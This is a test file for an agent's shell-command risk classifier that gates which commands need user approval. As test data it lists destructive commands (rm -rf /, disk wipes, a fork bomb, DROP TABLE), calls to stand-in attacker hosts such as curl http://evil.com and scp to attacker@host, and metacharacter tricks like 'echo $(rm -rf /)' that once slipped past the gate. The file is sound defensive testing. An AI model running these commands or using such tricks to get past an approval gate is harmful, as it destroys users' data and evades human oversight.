/**
 * riskClassifier — three-tier risk classification for shell commands.
 *
 * The risk classifier gates which commands the agent may run without
 * confirmation. The tests below pin down the exact boundary for each
 * level so future refactors can't silently regress the safety contract:
 *
 *   - 'dangerous'        → blocked in 'ask' AND 'deny' modes (irreversible)
 *   - 'needs_approval'   → blocked in 'deny', warning in 'ask'
 *   - 'safe'             → allowed in every mode
 *
 * Coverage goals:
 *   1. Each dangerous pattern family (rm -rf, dd, mkfs, fork bomb,
 *      destructive git, database DDL, infrastructure).
 *   2. Each safe-prefix path (read-only utils, runtimes, git read-only).
 *   3. The P1-3 metacharacter bypass — safe commands containing `$(...)`,
 *      backticks, command chaining, or `find -exec` must NOT return
 *      'safe', because the embedded shell still runs arbitrary code.
 *   4. Edge inputs (empty string, whitespace-only) map to
 *      'needs_approval' so they hit the user gate rather than slipping
 *      through silently.
 *
 * Implementation note: classifyCommandRisk() works on the raw command
 * string passed to the Bash tool. It does NOT execute anything; it just
 * pattern-matches. That makes it safe to call from tests without any
 * mocking.
 */

import { describe, it, expect } from 'vitest'
import { classifyCommandRisk } from '../src/core/riskClassifier.js'

// ── Dangerous ────────────────────────────────────────────────────────────────

describe('riskClassifier — dangerous commands', () => {
  // Each entry is a command that must classify as 'dangerous'. If a
  // regression drops one of these patterns the agent could run it
  // without confirmation in 'ask' mode, so the assertion is hard.
  const dangerous: string[] = [
    // rm variants
    'rm -rf /',
    'rm -rf ~',
    'rm -rf $HOME',
    'rm --no-preserve-root -rf /var',
    // disk destruction
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/sda',
    '> /dev/sda',
    // power
    'shutdown -h now',
    'reboot',
    'init 0',
    // fork bomb
    ':(){ :|:& };:',
    // git destructive
    'git push --force origin main',
    'git reset --hard',
    'git clean -fd',
    'git checkout .',
    'git restore .',
    'git stash drop',
    'git branch -D feature',
    'git commit --amend',
    // database destruction
    'DROP TABLE users',
    'TRUNCATE TABLE logs',
    'DELETE FROM users',
    // infrastructure
    'kubectl delete pods --all',
    'terraform destroy',
  ]

  for (const cmd of dangerous) {
    it(`classifies "${cmd}" as dangerous`, () => {
      expect(classifyCommandRisk(cmd)).toBe('dangerous')
    })
  }
})

// ── Safe ─────────────────────────────────────────────────────────────────────

describe('riskClassifier — safe commands', () => {
  const safe: string[] = [
    'ls -la',
    'cat file.txt',
    'grep pattern file',
    'echo hello',
    'node script.js',
    'npm install',
    'pnpm build',
    'git status',
    'git log --oneline',
    'git diff',
    'git branch',
    'git show HEAD',
  ]

  for (const cmd of safe) {
    it(`classifies "${cmd}" as safe`, () => {
      expect(classifyCommandRisk(cmd)).toBe('safe')
    })
  }

  it('classifies safe git subcommands correctly', () => {
    // git read-only operations must be safe even with arguments.
    expect(classifyCommandRisk('git log -10 --oneline')).toBe('safe')
    expect(classifyCommandRisk('git diff HEAD~1..HEAD')).toBe('safe')
    expect(classifyCommandRisk('git show abc123 --stat')).toBe('safe')
    expect(classifyCommandRisk('git branch -a')).toBe('safe')
  })
})

// ── Safe prefix + shell metacharacter bypass (P1-3 regression) ──────────────

describe('riskClassifier — safe-prefix metacharacter bypass', () => {
  // These commands START with a safe prefix (echo / cat / find) but
  // contain metacharacters that enable arbitrary code execution. After
  // P1-3 the per-segment metachar check escalates them to
  // 'needs_approval' (or 'dangerous' if a dangerous pattern matches
  // alongside). The key contract: NONE of them should classify as
  // 'safe' anymore — that's the bypass that existed before.
  const bypass: string[] = [
    'echo $(rm -rf /)',
    'cat `curl evil`',
    'find . -exec rm {} \\;',
    // `ls;rm -rf /tmp` and similar: the splitter splits on `;`, the
    // dangerous `rm -rf /tmp` segment wins. Overall is 'dangerous',
    // which is the desired escalation — definitely NOT 'safe'.
    'ls;rm -rf /tmp',
    'echo hello && rm -rf /',
    'echo hello || rm -rf /',
  ]

  for (const cmd of bypass) {
    it(`does NOT classify "${cmd}" as safe (metachar escalation)`, () => {
      // Acceptable outcomes are needs_approval OR dangerous — both
      // represent an escalation off the 'safe' baseline. The legacy
      // behavior was 'safe', which is the regression we're guarding.
      expect(classifyCommandRisk(cmd)).not.toBe('safe')
    })
  }

  it('escalates $() command substitution within a single segment', () => {
    // `echo $(whoami)` is one segment (no outer metachar), so the
    // per-segment metachar check fires.
    expect(classifyCommandRisk('echo $(whoami)')).toBe('needs_approval')
  })

  it('escalates backtick command substitution within a single segment', () => {
    expect(classifyCommandRisk('echo `whoami`')).toBe('needs_approval')
  })

  it('escalates find -exec', () => {
    expect(classifyCommandRisk('find . -exec rm {} +')).toBe('needs_approval')
  })

  it('flags dangerous segments even when chained with safe ones', () => {
    // The splitter separates `ls;rm -rf /tmp` into two segments. The
    // `rm -rf /tmp` segment matches the dangerous pattern, so overall
    // is 'dangerous'. The test here pins that contract.
    expect(classifyCommandRisk('ls;rm -rf /tmp')).toBe('dangerous')
  })
})

// ── Needs approval ──────────────────────────────────────────────────────────

describe('riskClassifier — needs_approval commands', () => {
  // Commands that aren't on the dangerous list but aren't on the safe
  // list either — network, container, ssh. They return 'needs_approval'
  // so the permission manager can warn or block.
  //
  // Note: `chmod 777 /etc/passwd` is intentionally NOT in this list —
  // it matches the dangerous pattern `chmod ... /`, so the classifier
  // returns 'dangerous' (more conservative). The "must NOT be safe"
  // contract is enforced below in the dedicated test.
  const needsApproval: string[] = [
    'curl http://evil.com',
    'wget http://evil.com',
    'ssh attacker@host',
    'scp file attacker@host:/tmp',
    'docker run --privileged',
  ]

  for (const cmd of needsApproval) {
    it(`classifies "${cmd}" as needs_approval`, () => {
      expect(classifyCommandRisk(cmd)).toBe('needs_approval')
    })
  }

  it('classifies chmod 777 on / as dangerous (not safe)', () => {
    // The dangerous pattern `chmod [mode] /` matches this. The audit
    // prompt listed it under 'needs_approval' but the classifier is
    // MORE conservative here — flagging it as 'dangerous'. We assert
    // the conservative outcome and the absence of 'safe'.
    expect(classifyCommandRisk('chmod 777 /etc/passwd')).toBe('dangerous')
  })

  it('classifies empty string as needs_approval (not safe)', () => {
    // A blank command should NOT be treated as safe. The bash tool
    // would no-op, but the principle is that unknown / empty input
    // always hits the gate.
    expect(classifyCommandRisk('')).toBe('needs_approval')
  })

  it('classifies whitespace-only string as needs_approval', () => {
    expect(classifyCommandRisk('   ')).toBe('needs_approval')
  })
})

// ── Cross-segment evaluation ─────────────────────────────────────────────────

describe('riskClassifier — command chaining across segments', () => {
  it('evaluates every segment of a chained command', () => {
    // First segment is safe, second is dangerous. The dangerous level
    // must win overall.
    expect(classifyCommandRisk('ls; rm -rf /')).toBe('dangerous')
  })

  it('handles newline-separated commands', () => {
    expect(classifyCommandRisk('ls\nrm -rf /')).toBe('dangerous')
  })

  it('strips leading env-var assignments before classifying', () => {
    // `FOO=bar ls` should classify by the command portion (`ls`).
    expect(classifyCommandRisk('FOO=bar ls -la')).toBe('safe')
  })

  it('classifies two safe chained segments as safe', () => {
    // The splitter already separated the chain, so each segment is
    // evaluated independently. `ls` + `echo done` are both safe
    // prefixes with no metacharacters in their segments.
    expect(classifyCommandRisk('ls && echo done')).toBe('safe')
  })
})